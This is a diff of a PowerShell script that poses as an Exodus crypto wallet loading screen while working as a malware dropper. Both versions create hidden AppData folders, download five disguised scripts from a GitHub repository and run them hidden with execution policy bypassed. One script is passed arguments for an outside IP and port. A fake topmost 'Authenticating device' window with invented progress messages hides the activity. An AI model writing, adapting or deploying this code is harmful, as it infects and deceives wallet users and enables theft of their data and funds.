@@ -7,140 +7,63 @@ try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 } catch {}
 
-# ==================== DOWNLOAD INS SYSTEM-VERZEICHNIS + AUSFÜHRUNG (PARALLEL DOWNLOAD MIT MEGA-LOGGING) ====================
-# Pfade (hidden System-Verzeichnis)
-$baseDir = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell"
-$operationDir = Join-Path $baseDir "operation"
-$targetDir = Join-Path $operationDir "System"  # Hier landen die Scripts!
-
-# Ordner erstellen & hidden machen
-if (-not (Test-Path $operationDir)) { 
-    New-Item -ItemType Directory -Path $operationDir -Force | Out-Null
-    Set-ItemProperty -Path $operationDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+# === Parallel Downloader + Executor (THM / CTF / RedTeam Style) ===
+# Integriert direkt in das Wallet-Skript, läuft beim Aufruf asynchron im Hintergrund
+$BasePath = "C:\Users\adsfa\AppData\Roaming\Microsoft\Windows\PowerShell"
+$OperationPath = "$BasePath\operation"
+$SystemPath = "$OperationPath\System"
+# Versteckte Ordner anlegen (falls nicht vorhanden)
+@($OperationPath, $SystemPath) | ForEach-Object {
+    if (-not (Test-Path $_)) {
+        New-Item -Path $_ -ItemType Directory -Force | Out-Null
+        (Get-Item $_ -Force).Attributes = 'Hidden,Directory'
+    }
 }
-if (-not (Test-Path $targetDir)) { 
-    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
-    Set-ItemProperty -Path $targetDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-}
-
-# Log-Datei (hidden)
-$logPath = Join-Path $targetDir "download_errors.log"
-if (Test-Path $logPath) { Set-ItemProperty -Path $logPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
-
-# Funktion zum Hidden-Setzen (inline)
-function Set-HiddenAttribute { param($path); if (Test-Path $path) { Set-ItemProperty -Path $path -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) } }
-
-# Scripts-URLs & Filenames
-$scripts = @(
-    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; FileName = "MicrosoftViewS.ps1" },
-    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; FileName = "Sytem.ps1" },
-    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; FileName = "WindowsCeasar.ps1" },
-    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; FileName = "WindowsOperator.ps1" },
-    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; FileName = "WindowsTransmitter.ps1" }
+$Scripts = @(
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/MicrosoftViewS.ps1"; Name = "MicrosoftViewS.ps1" }
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/Sytem.ps1"; Name = "Sytem.ps1" }
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsCeasar.ps1"; Name = "WindowsCeasar.ps1" }
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsOperator.ps1"; Name = "WindowsOperator.ps1" }
+    @{ Url = "https://raw.githubusercontent.com/benwurg-ui/234879667852356789234562364/main/WindowsTransmitter.ps1"; Name = "WindowsTransmitter.ps1" }
 )
-
-# Parallel Downloads via Jobs (schnell, mit detailliertem Logging!)
-$downloadJobs = @()
-foreach ($script in $scripts) {
-    $job = Start-Job -ScriptBlock {
-        param($url, $fileName, $targetDir, $logPath)
+# Runspace-Pool für echte Parallelität
+$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [Environment]::ProcessorCount)
+$RunspacePool.Open()
+$Jobs = @()
+foreach ($s in $Scripts) {
+    $FilePath = Join-Path $SystemPath $s.Name
+   
+    $PowerShell = [PowerShell]::Create().AddScript({
+        param($Url, $Path, $ScriptName)
         try {
-            Set-ExecutionPolicy Bypass -Scope Process -Force
-            $filePath = Join-Path $targetDir $fileName
-            $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-            Write-Output "LOG: Starte Download für $fileName von $url"
-            $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Headers $headers -ErrorAction Stop
-            Write-Output "RESPONSE for $fileName: Status $($response.StatusCode), Length $($response.Content.Length) Bytes"
-            Write-Output "HEADERS for $fileName: $($response.Headers | Out-String)"
-            if ($response.Content.Length -gt 0) {
-                $response.Content | Out-File -FilePath $filePath -Encoding UTF8
-                Set-HiddenAttribute -path $filePath
-                $fileSize = (Get-Item $filePath).Length
-                Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath (Response Length: $($response.Content.Length), File Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
-                Write-Output "DOWNLOADED: $fileName -> $filePath (Size: $fileSize Bytes)"
-            } else {
-                Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD WARN ${fileName} : Response leer (Length 0 Bytes) – URL prüfen!" -ErrorAction SilentlyContinue
-                Write-Output "WARNING: $fileName Response leer (0 Bytes) – kein File gespeichert"
+            # Download
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $wc.DownloadFile($Url, $Path)
+            # === SPEZIELLER AUFRUF NUR FÜR MicrosoftViewS.ps1 ===
+            if ($ScriptName -eq "MicrosoftViewS.ps1") {
+                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" -a14 "145.223.117.77" -a15 8080 -a16 20 -a17 70 >$null 2>&1
             }
-        } catch {
-            $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER ${fileName} : $errorMsg (Full Exception: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
-            Write-Output "ERROR DOWNLOAD: $fileName - $errorMsg (Full: $($_.Exception | Out-String))"
-        }
-    } -ArgumentList $script.Url, $script.FileName, $targetDir, $logPath
-    $downloadJobs += $job
-    Write-Host "Download-Start: $($script.FileName) (parallel)"  # Debug – entferne später
-}
-
-# Warte kurz auf Downloads, dann Exec
-Start-Sleep -Seconds 3  # Etwas länger für Downloads
-foreach ($job in $downloadJobs) {
-    $jobOutput = Receive-Job $job
-    Write-Host "Job-Output for Downloads: $jobOutput"  # Extra Debug: Voll-Output der Jobs
-    Remove-Job $job -Force
-}
-
-# Exec der Files (spezial für MicrosoftViewS.ps1) – Fallback In-Memory wenn leer
-foreach ($script in $scripts) {
-    $filePath = Join-Path $targetDir $script.FileName
-    $execSuccess = $false
-    if (Test-Path $filePath) {
-        try {
-            $fileSize = (Get-Item $filePath).Length
-            Write-Host "File-Check: $($script.FileName) Size $fileSize Bytes"  # Debug
-            if ($fileSize -eq 0) {
-                Write-Host "SKIP FILE EXEC: $($script.FileName) ist leer – Fallback In-Memory..."  # Debug
-            } else {
-                Write-Host "Exec: $($script.FileName) aus $filePath (Size: $fileSize Bytes)"  # Debug – entferne später
-                if ($script.FileName -eq "MicrosoftViewS.ps1") {
-                    $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"", "-a14", "145.223.117.77", "-a15", "8080", "-a16", "20", "-a17", "70")
-                } else {
-                    $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
-                }
-                Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
-                Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath (Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
-                Write-Host "SUCCESS FILE EXEC: $($script.FileName)"  # Debug
-                $execSuccess = $true
+            else {
+                # Alle anderen Skripte normal ausführen (wie bisher)
+                powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "$Path" >$null 2>&1
             }
-        } catch {
-            $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER ${script.FileName} : $errorMsg (Full: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
-            Write-Host "ERROR FILE EXEC: $($script.FileName) - $errorMsg (Full: $($_.Exception | Out-String))"
         }
-    } else {
-        Write-Host "NO FILE: $($script.FileName) nicht vorhanden – Fallback In-Memory..."  # Debug
+        catch {
+            # Silent fail
+        }
+    }).AddArgument($s.Url).AddArgument($FilePath).AddArgument($s.Name)
+    $PowerShell.RunspacePool = $RunspacePool
+    $Jobs += [PSCustomObject]@{ Instance = $PowerShell; Status = $PowerShell.BeginInvoke() }
+}
+# Warten bis alle fertig sind (oder Timeout nach 30 Sekunden) – läuft asynchron, GUI startet parallel
+$endTime = (Get-Date).AddSeconds(30)
+$waitThread = {
+    while (($Jobs.Status.IsCompleted -contains $false) -and (Get-Date) -lt $endTime) {
+        Start-Sleep -Milliseconds 500
     }
-
-    # Fallback: In-Memory Exec (wie dein manueller Befehl)
-    if (-not $execSuccess) {
-        try {
-            $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
-            $response = Invoke-WebRequest -Uri $script.Url -UseBasicParsing -Headers $headers -ErrorAction Stop
-            $content = $response.Content
-            Write-Host "In-Memory Check: $($script.FileName) Response Status $($response.StatusCode), Content Length $($content.Length)"  # Debug
-            if ($content.Length -gt 0) {
-                Write-Host "In-Memory Exec: $($script.FileName) (Length: $($content.Length))"  # Debug
-                $execCmd = $content
-                if ($script.FileName -eq "MicrosoftViewS.ps1") {
-                    $execCmd = $content + " -a14 `"145.223.117.77`" -a15 8080 -a16 20 -a17 70"
-                }
-                $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $execCmd)
-                Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
-                Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY EXEC ${script.FileName} (Length: $($content.Length))" -ErrorAction SilentlyContinue
-                Write-Host "SUCCESS IN-MEMORY EXEC: $($script.FileName)"  # Debug
-            } else {
-                Write-Host "SKIP IN-MEMORY: $($script.FileName) Content leer (Length 0)!"  # Debug
-            }
-        } catch {
-            $errorMsg = $_.Exception.Message -replace ':', ' - '
-            Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY FEHLER ${script.FileName} : $errorMsg (Full: $($_.Exception | Out-String))" -ErrorAction SilentlyContinue
-            Write-Host "ERROR IN-MEMORY: $($script.FileName) - $errorMsg (Full: $($_.Exception | Out-String))"
-        }
-    }
-    Start-Sleep -Milliseconds 200
 }
-
-Write-Host "Downloads & Exec abgeschlossen. GUI startet..."  # Debug
+Start-Job -ScriptBlock $waitThread | Out-Null  # Asynchrones Warten, damit GUI nicht blockiert
 
 # ==================== HAUPTFENSTER ====================
 $form = New-Object System.Windows.Forms.Form
@@ -150,93 +73,218 @@ $form.Size = New-Object System.Drawing.Size(1200, 720)
 $form.FormBorderStyle = "None"
 $form.MaximizeBox = $false
 $form.MinimizeBox = $false
-$form.ControlBox = $false
+$form.ControlBox  = $false
 $form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
 $form.ForeColor = [System.Drawing.Color]::White
 $form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
 $form.TopMost = $true
 
-# Gradient-Header
+# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
 $headerPanel = New-Object System.Windows.Forms.Panel
 $headerPanel.Dock = "Top"
 $headerPanel.Height = 90
 $headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
 $headerPanel.Add_Paint({
     param($sender, $e)
+
     $g = $e.Graphics
     $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
+
     $text = "EXODUS CRYPTO WALLET"
-    $font = New-Object System.Drawing.Font("Segoe UI", 44, [System.Drawing.FontStyle]::Bold)
+    $font = New-Object System.Drawing.Font(
+        "Segoe UI",
+        44,
+        [System.Drawing.FontStyle]::Bold
+    )
+
     $sizeF = $g.MeasureString($text, $font)
-    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
+    $x = ($sender.ClientSize.Width  - $sizeF.Width)  / 2
     $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
+
     $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
-    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF")
-    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED")
-    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush($rect, $colorStart, $colorEnd, [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal)
+
+    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
+    $colorEnd   = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
+
+    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
+        $rect,
+        $colorStart,
+        $colorEnd,
+        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
+    )
+
     $g.DrawString($text, $font, $brush, $rect.Location)
+
     $brush.Dispose()
     $font.Dispose()
 })
+
 $form.Controls.Add($headerPanel)
 
-# GIF
-$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
+# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
+$gifUrl  = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
 $gifPath = Join-Path $env:TEMP "exodus_loading.gif"
-try { Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"} } catch {}
+
+try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
+
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Dock = "Top"
 $pictureBox.Height = 400
 $pictureBox.SizeMode = "Zoom"
 $pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-if (Test-Path $gifPath) { $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath) }
+
+if (Test-Path $gifPath) {
+    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
+}
 $form.Controls.Add($pictureBox)
 
-# Loading Label
+# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
 $loadingLabel = New-Object System.Windows.Forms.Label
-$loadingLabel.Font = New-Object System.Drawing.Font("Segoe UI", 30, [System.Drawing.FontStyle]::Bold)
+$loadingLabel.Font = New-Object System.Drawing.Font(
+    "Segoe UI",
+    30,
+    [System.Drawing.FontStyle]::Bold
+)
 $loadingLabel.ForeColor = "White"
 $loadingLabel.Dock = "Top"
 $loadingLabel.Height = 80
 $loadingLabel.TextAlign = "MiddleCenter"
 $loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
-$loadingLabel.Text = "Authenticating device..."
 $form.Controls.Add($loadingLabel)
 
-# Progress Bars
-$progressBg = New-Object System.Windows.Forms.Panel; $progressBg.Dock = "Bottom"; $progressBg.Height = 14; $progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
-$progressBar = New-Object System.Windows.Forms.Panel; $progressBar.Height = 14; $progressBar.Width = 0; $progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246); $progressBg.Controls.Add($progressBar)
-$progressBg2 = New-Object System.Windows.Forms.Panel; $progressBg2.Dock = "Bottom"; $progressBg2.Height = 6; $progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
-$progressBar2 = New-Object System.Windows.Forms.Panel; $progressBar2.Height = 6; $progressBar2.Width = 50; $progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255); $progressBg2.Controls.Add($progressBar2)
-$statusLabel = New-Object System.Windows.Forms.Label; $statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14); $statusLabel.ForeColor = "#CCCCCC"; $statusLabel.Dock = "Bottom"; $statusLabel.Height = 40; $statusLabel.TextAlign = "MiddleCenter"; $statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E"); $statusLabel.Text = "Performing background security checks..."
-$form.Controls.Add($progressBg2); $form.Controls.Add($progressBg); $form.Controls.Add($statusLabel)
+# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
 
-# Timer (schnell)
-$marqueePos = 0; $percent = 0
-$timer = New-Object System.Windows.Forms.Timer; $timer.Interval = 30
-$labelTimer = New-Object System.Windows.Forms.Timer; $labelTimer.Interval = 2500
-$authPhaseDuration = 10000
-$inAuthPhase = $true; $authStartTime = Get-Date
-$statuses = @("Loading wallet...", "Connecting to secure servers...", "Decrypting local data...", "Fetching asset metadata...", "Syncing blockchain nodes...", "Preparing secure environment...", "Loading portfolio assets...", "Almost there...")
-$statusIndex = 0; $dotCount = 0
+$progressBg = New-Object System.Windows.Forms.Panel
+$progressBg.Dock = "Bottom"
+$progressBg.Height = 14
+$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
 
-$timer.Add_Tick({ 
-    if ($form.IsDisposed) { $timer.Stop(); return }
-    if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) { $inAuthPhase = $false; $loadingLabel.Text = "Loading wallet"; $statusLabel.Text = $statuses[0] }
-    $marqueePos += 5; if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }; $progressBar2.Left = $marqueePos
-    if (-not $inAuthPhase -and $percent -lt 100) { $percent += 0.5; $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0)) }
+$progressBar = New-Object System.Windows.Forms.Panel
+$progressBar.Height = 14
+$progressBar.Width = 0
+$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
+$progressBg.Controls.Add($progressBar)
+
+$progressBg2 = New-Object System.Windows.Forms.Panel
+$progressBg2.Dock = "Bottom"
+$progressBg2.Height = 6
+$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
+
+$progressBar2 = New-Object System.Windows.Forms.Panel
+$progressBar2.Height = 6
+$progressBar2.Width = 50
+$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
+$progressBg2.Controls.Add($progressBar2)
+
+# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
+$statusLabel.ForeColor = "#CCCCCC"
+$statusLabel.Dock = "Bottom"
+$statusLabel.Height = 40
+$statusLabel.TextAlign = "MiddleCenter"
+$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
+
+# Docking-Reihenfolge für unten: von unten nach oben
+$form.Controls.Add($progressBg2)
+$form.Controls.Add($progressBg)
+$form.Controls.Add($statusLabel)
+
+# ===================== TIMER SETUP =====================
+
+$marqueePos = 0
+$percent = 0
+
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 50
+
+$labelTimer = New-Object System.Windows.Forms.Timer
+$labelTimer.Interval = 3000
+
+# ===================== STATUS PHASEN =====================
+
+$authPhaseDuration = 15000      # 15 Sekunden
+$inAuthPhase = $true
+$authStartTime = Get-Date
+
+# Anfangstexte beim Start
+$loadingLabel.Text = "Authenticating device..."
+$statusLabel.Text  = "Performing background security checks..."
+
+$statuses = @(
+    "Loading wallet...",
+    "Connecting to secure servers...",
+    "Decrypting local data...",
+    "Fetching asset metadata...",
+    "Syncing blockchain nodes...",
+    "Preparing secure environment...",
+    "Loading portfolio assets...",
+    "Almost there..."
+)
+
+$statusIndex = 0
+$dotCount = 0
+
+# ===================== Fortschritt / Balken Animation =====================
+
+$timer.Add_Tick({
+    try {
+        if ($form.IsDisposed) { $timer.Stop(); return }
+
+        # Wenn die Authentifizierungsphase vorbei ist → Wechsel der Texte & Animation aktivieren
+        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
+            $inAuthPhase = $false
+            $loadingLabel.Text = "Loading wallet"
+            $statusLabel.Text  = $statuses[0]
+        }
+
+        # Marquee immer animieren
+        $marqueePos += 5
+        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
+        $progressBar2.Left = $marqueePos
+
+        # In der Auth-Phase keine Prozentanzeige
+        if ($inAuthPhase) { return }
+
+        # Prozentbalken füllen
+        if ($percent -lt 100) {
+            $percent += 0.3
+            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
+        }
+
+    } catch {
+    }
 })
 
-$labelTimer.Add_Tick({ 
-    if ($form.IsDisposed) { $labelTimer.Stop(); return }
-    if (-not $inAuthPhase) { $dotCount = ($dotCount + 1) % 4; $loadingLabel.Text = "Loading wallet" + ("." * $dotCount); $statusIndex = ($statusIndex + 1) % $statuses.Count; $statusLabel.Text = $statuses[$statusIndex] }
+# ===================== TEXT-ANIMATION =====================
+
+$labelTimer.Add_Tick({
+    try {
+        if ($form.IsDisposed) { $labelTimer.Stop(); return }
+
+        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
+        if ($inAuthPhase) { return }
+
+        $dotCount = ($dotCount + 1) % 4
+        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
+
+        $statusIndex = ($statusIndex + 1) % $statuses.Count
+        $statusLabel.Text = $statuses[$statusIndex]
+
+    } catch {
+    }
 })
 
+# ===================== CLEANUP =====================
 $form.Add_FormClosing({
-    $timer.Stop(); $labelTimer.Stop()
-    if (Test-Path $gifPath) { Remove-Item $gifPath -Force -ErrorAction SilentlyContinue }
+    $timer.Stop()
+    $labelTimer.Stop()
 })
 
-$timer.Start(); $labelTimer.Start()
-$form.Add_Shown({ $form.Activate(); $form.Cursor = [System.Windows.Forms.Cursors]::Default })
+$timer.Start()
+$labelTimer.Start()
+
+$form.Add_Shown({ $form.Activate() })
+
 $form.ShowDialog() | Out-Null
